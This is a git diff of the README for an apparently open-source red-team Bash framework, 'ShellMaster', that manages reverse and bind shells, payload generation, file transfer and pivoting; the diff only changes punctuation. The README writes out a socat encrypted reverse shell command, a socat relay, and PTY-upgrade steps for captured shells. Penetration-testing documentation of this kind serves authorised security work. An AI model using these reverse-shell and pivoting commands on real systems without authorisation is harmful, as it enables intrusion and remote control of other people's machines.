@@ -21,7 +21,7 @@
 
 ## 📖 About The Project
 
-**ShellMaster** is a professional-grade, modular Bash framework for managing reverse shells, encrypted listeners, payload generation, file transfers, and network pivoting — built for authorized penetration testing and security research.
+**ShellMaster** is a professional-grade, modular Bash framework for managing reverse shells, encrypted listeners, payload generation, file transfers, and network pivoting : built for authorized penetration testing and security research.
 
 > **Legal Notice:** This tool is intended exclusively for authorized security assessments, red team exercises, and educational use in controlled environments. Unauthorized use against any system is illegal. See [Legal Disclaimer](#legal-disclaimer).
 
@@ -63,9 +63,9 @@ All activity is logged to `logs/framework.log` for audit purposes.
 
 | Module | Capability |
 |--------|------------|
-| **Startup** | Dependency check on launch — warns immediately if `socat`, `nc`, `python3`, etc. are missing |
+| **Startup** | Dependency check on launch : warns immediately if `socat`, `nc`, `python3`, etc. are missing |
 | **Listeners** | Reverse & bind listeners with auto-detected `nc`/`ncat`/`netcat` variant and correct flag handling, optional `rlwrap`, session tracking, session notes |
-| **Payloads** | Bash, PowerShell, Python, Perl, Ruby, PHP generators — auto-detected attacker IP, Base64 encoding, batch generation, save to file |
+| **Payloads** | Bash, PowerShell, Python, Perl, Ruby, PHP generators : auto-detected attacker IP, Base64 encoding, batch generation, save to file |
 | **Encryption** | `socat` SSL/TLS listener, RSA-2048 self-signed cert generation, encrypted payload output |
 | **Transfer** | SCP upload/download, HTTP file server (`python3 -m http.server`), MD5 + SHA256 checksum verification, transfer history |
 | **Relay / Pivot** | `socat` port relay, SSH local / remote / dynamic (SOCKS) tunnels, active relay management |
@@ -78,7 +78,7 @@ All activity is logged to `logs/framework.log` for audit purposes.
 
 ```
 redteam-shell-framework/
-├── shellmaster.sh          # Main CLI — interactive menu & module loader
+├── shellmaster.sh          # Main CLI : interactive menu & module loader
 ├── config.sh               # Global paths, version, and environment config
 ├── utils.sh                # Colors, validation, logging helpers, session utils
 │
@@ -129,13 +129,13 @@ At startup, ShellMaster checks for all tools and prints a warning for anything t
 | `python3` | HTTP file server, PTY upgrade | Transfer, PTY Upgrade |
 | `rlwrap` | Command history and line editing in listeners | Listeners |
 
-### Install dependencies — Debian / Ubuntu
+### Install dependencies : Debian / Ubuntu
 
 ```bash
 sudo apt update && sudo apt install -y netcat-traditional socat openssl rlwrap openssh-client python3
 ```
 
-### Install dependencies — RHEL / CentOS
+### Install dependencies : RHEL / CentOS
 
 ```bash
 sudo yum install -y ncat socat openssl rlwrap openssh-clients python3
@@ -145,7 +145,7 @@ sudo yum install -y ncat socat openssl rlwrap openssh-clients python3
 
 ## ⚙️ Installation
 
-### Option 1 — Git (recommended)
+### Option 1 : Git (recommended)
 
 ```bash
 git clone https://github.com/taguianas/redteam-shell-framework.git
@@ -153,7 +153,7 @@ cd redteam-shell-framework
 bash shellmaster.sh
 ```
 
-### Option 2 — wget
+### Option 2 : wget
 
 ```bash
 wget https://github.com/taguianas/redteam-shell-framework/archive/refs/heads/main.zip
@@ -162,7 +162,7 @@ cd redteam-shell-framework-main
 bash shellmaster.sh
 ```
 
-### Option 3 — curl
+### Option 3 : curl
 
 ```bash
 curl -L https://github.com/taguianas/redteam-shell-framework/archive/refs/heads/main.zip -o framework.zip
@@ -230,17 +230,17 @@ The interactive menu will load:
 Start a reverse or bind listener on any port. The framework auto-detects which netcat variant is installed (`ncat`, OpenBSD `nc`, or traditional `nc`) and uses the correct flags for each. Optionally wrap with `rlwrap` for command history. Each session is assigned a unique ID and logged to `logs/sessions/`. After a session ends you are prompted to add a note; notes can also be managed from the menu at any time.
 
 ```
-1. Start Reverse Listener   — catches incoming shells on a port
-2. Start Bind Listener      — opens a backdoor that waits for connection
-3. List Active Listeners    — shows active nc/ncat processes
-4. Stop Listener            — kill by PID
-5. Session Notes            — add or view notes on any session
+1. Start Reverse Listener   : catches incoming shells on a port
+2. Start Bind Listener      : opens a backdoor that waits for connection
+3. List Active Listeners    : shows active nc/ncat processes
+4. Stop Listener            : kill by PID
+5. Session Notes            : add or view notes on any session
 6. Back
 ```
 
 ### 2. Payload Generator
 
-Generate ready-to-use reverse shell one-liners. Your local IP is auto-detected and pre-filled — just confirm or override it. Supports Base64 encoding and saving to `payloads/` with metadata.
+Generate ready-to-use reverse shell one-liners. Your local IP is auto-detected and pre-filled : just confirm or override it. Supports Base64 encoding and saving to `payloads/` with metadata.
 
 ```
 1.  Bash Reverse Shell
@@ -276,10 +276,10 @@ socat OPENSSL:<LHOST>:<LPORT>,verify=0 EXEC:/bin/bash
 Upload and download files over SCP, or spin up a quick HTTP server for targets that don't have SSH. Verify file integrity with MD5 and SHA256 after transfer.
 
 ```
-1. Upload File          — local → remote via SCP
-2. Download File        — remote → local via SCP
-3. Serve Files (HTTP)   — python3 -m http.server with auto-detected IP and copy-paste wget/curl commands
-4. Verify Checksum      — MD5 + SHA256 of any file
+1. Upload File          : local → remote via SCP
+2. Download File        : remote → local via SCP
+3. Serve Files (HTTP)   : python3 -m http.server with auto-detected IP and copy-paste wget/curl commands
+4. Verify Checksum      : MD5 + SHA256 of any file
 5. View Transfer History
 6. Back
 ```
@@ -289,8 +289,8 @@ Upload and download files over SCP, or spin up a quick HTTP server for targets t
 Create port-forwarding relays with `socat` or SSH tunnels to pivot through intermediate hosts.
 
 ```
-1. Create socat Relay   — forward: listen_port → host:port
-2. Create SSH Tunnel    — local (-L), remote (-R), or SOCKS (-D)
+1. Create socat Relay   : forward: listen_port → host:port
+2. Create SSH Tunnel    : local (-L), remote (-R), or SOCKS (-D)
 3. List Active Relays
 4. Stop Relay
 5. Back
@@ -306,10 +306,10 @@ socat TCP-LISTEN:4444,fork,reuseaddr TCP:192.168.1.50:4444
 Step-by-step commands to upgrade a limited reverse shell to a fully interactive PTY.
 
 ```
-1. Python PTY Upgrade    — pty.spawn('/bin/bash') + stty raw -echo
-2. Script PTY Upgrade    — script -qc /bin/bash /dev/null
-3. Fix Environment       — TERM, PATH, stty rows/cols, reset
-4. Enable Terminal Features — history, colour prompt, tab completion
+1. Python PTY Upgrade    : pty.spawn('/bin/bash') + stty raw -echo
+2. Script PTY Upgrade    : script -qc /bin/bash /dev/null
+3. Fix Environment       : TERM, PATH, stty rows/cols, reset
+4. Enable Terminal Features : history, colour prompt, tab completion
 5. Back
 ```
 
